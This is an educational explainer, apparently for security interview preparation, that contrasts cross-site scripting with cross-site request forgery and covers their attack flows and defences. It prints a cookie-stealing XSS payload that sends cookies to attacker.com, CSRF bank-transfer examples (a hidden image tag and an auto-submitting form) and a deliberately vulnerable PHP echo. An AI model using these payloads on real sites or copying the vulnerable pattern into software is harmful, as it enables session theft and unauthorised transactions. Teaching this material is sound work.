# Differentiate XSS from CSRF

## Overview

Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two distinct but sometimes related web application vulnerabilities. Both can lead to significant security breaches, but they operate through different attack vectors and exploit different security weaknesses. Understanding the differences is crucial for implementing proper security controls and defense mechanisms.

## Key Differences

| Aspect | Cross-Site Scripting (XSS) | Cross-Site Request Forgery (CSRF) |
|--------|---------------------------|----------------------------------|
| **Definition** | Injection of malicious scripts into web pages viewed by other users | Tricking a user's browser into making unwanted requests to a website where the user is authenticated |
| **Attack Target** | The user/browser | The website's functionality |
| **Primary Weakness** | Insufficient input validation or output encoding | Lack of request origin validation |
| **Attacker Goal** | Execute arbitrary JavaScript in the context of the victim's browser | Perform actions on behalf of the authenticated user without their knowledge |
| **User Interaction** | Typically requires victim to visit a specific URL or page | Requires victim to be authenticated and visit attacker's site |
| **Data Accessed** | Can access browser data (cookies, localStorage, DOM) | Cannot directly access data, but can trigger state-changing actions |

## Cross-Site Scripting (XSS) in Detail

### Types of XSS Attacks

1. **Reflected XSS**
   - Non-persistent attack where malicious script is reflected off the web server
   - Typically delivered through phishing links or malicious URLs
   - Example: `https://example.com/search?q=<script>sendCookiesToAttacker()</script>`

2. **Stored XSS**
   - Persistent attack where malicious script is stored on the target server
   - Delivered when users browse affected content
   - Example: Malicious comment stored in a database that executes when viewed

3. **DOM-based XSS**
   - Occurs entirely in the browser when JavaScript modifies the DOM unsafely
   - Does not need to interact with the server
   - Example: `location.hash` being inserted into the page via `innerHTML`

### XSS Attack Flow

1. Attacker identifies an input vector that's not properly sanitized
2. Attacker crafts malicious payload (JavaScript)
3. Victim accesses the page containing the payload
4. Browser executes the malicious script in the context of the victim's session
5. Attacker can then steal cookies, redirect users, modify page content, etc.

### XSS Code Example

```html
<!-- Vulnerable code -->
<div>
  Search results for: <?php echo $_GET['query']; ?>
</div>

<!-- Attack payload -->
<script>
  var cookie = document.cookie;
  var img = new Image();
  img.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(cookie);
</script>
```

### XSS Prevention

1. **Input Validation**: Validate all user inputs against expected formats
2. **Output Encoding**: Encode special characters when rendering data in HTML, JavaScript, CSS, or URLs
3. **Content Security Policy (CSP)**: Restrict sources of executable scripts
4. **HttpOnly Cookies**: Prevent JavaScript from accessing sensitive cookies
5. **X-XSS-Protection Header**: Enable browser's built-in XSS filters

## Cross-Site Request Forgery (CSRF) in Detail

### Types of CSRF Attacks

1. **GET-based CSRF**
   - Uses GET requests to perform actions
   - Can be triggered by image tags, iframes, or other HTML elements
   - Example: `<img src="https://bank.com/transfer?to=attacker&amount=1000" width="0" height="0" />`

2. **POST-based CSRF**
   - Uses POST requests to submit forms
   - Usually requires JavaScript or auto-submitting forms
   - More difficult but still exploitable

### CSRF Attack Flow

1. User logs into a legitimate website (e.g., a banking site) and receives a session cookie
2. Without logging out, user visits a malicious website
3. The malicious site contains code that submits a request to the banking site
4. Browser automatically includes the user's cookies with this request
5. The banking site processes the request as legitimate because it contains valid authentication

### CSRF Code Example

```html
<!-- Malicious page that performs a CSRF attack -->
<html>
  <body onload="document.getElementById('csrf-form').submit()">
    <form id="csrf-form" action="https://bank.com/transfer" method="POST">
      <input type="hidden" name="recipient" value="attacker" />
      <input type="hidden" name="amount" value="10000" />
      <input type="hidden" name="csrf_token" value="known_or_guessed_token" /> <!-- If applicable -->
    </form>
  </body>
</html>
```

### CSRF Prevention

1. **Anti-CSRF Tokens**: Include unpredictable tokens in forms that the server validates
2. **Same-Site Cookies**: Set cookies with `SameSite=Strict` or `SameSite=Lax` to restrict cross-site sending
3. **Custom Headers**: Require requests to include custom headers that are not automatically sent in cross-site requests
4. **Referrer/Origin Checking**: Validate that requests come from expected sources
5. **Require Re-Authentication**: For sensitive operations, require password re-entry

## Security Implications

### XSS Impacts

- Cookie theft and session hijacking
- Keylogging and data theft
- Phishing within trusted contexts
- Web page defacement
- Malware distribution
- Browser exploitation

### CSRF Impacts

- Unauthorized state-changing requests
- Account compromises
- Financial theft
- Data modification
- Privilege escalation when targeting admin accounts

## Relationship Between XSS and CSRF

While distinct, these vulnerabilities can sometimes interact:

1. XSS can be used to bypass CSRF protections by stealing the anti-CSRF token
2. CSRF protections do not protect against XSS
3. Both require different but complementary protection mechanisms

## Common Interview Questions

- How could an XSS vulnerability be used to bypass CSRF protections?
- What makes DOM-based XSS different from other XSS types?
- Why aren't HTTPS and authentication sufficient to prevent CSRF?
- How do modern frameworks protect against XSS and CSRF?
- Can you explain the impact of the SameSite cookie attribute on CSRF?

## Interview Response Strategy

When answering this question:

1. **Clarify the fundamental difference**: XSS injects client-side script vs. CSRF triggers unwanted requests
2. **Explain attack vectors**: Discuss how each vulnerability works technically
3. **Detail impacts**: Outline the potential consequences of each
4. **Highlight prevention methods**: Demonstrate knowledge of security countermeasures
5. **Connect to modern web security**: Mention how modern standards like CSP and SameSite cookies help
6. **Use examples**: If time permits, outline a simple scenario for each attack type

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Mozilla Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/) 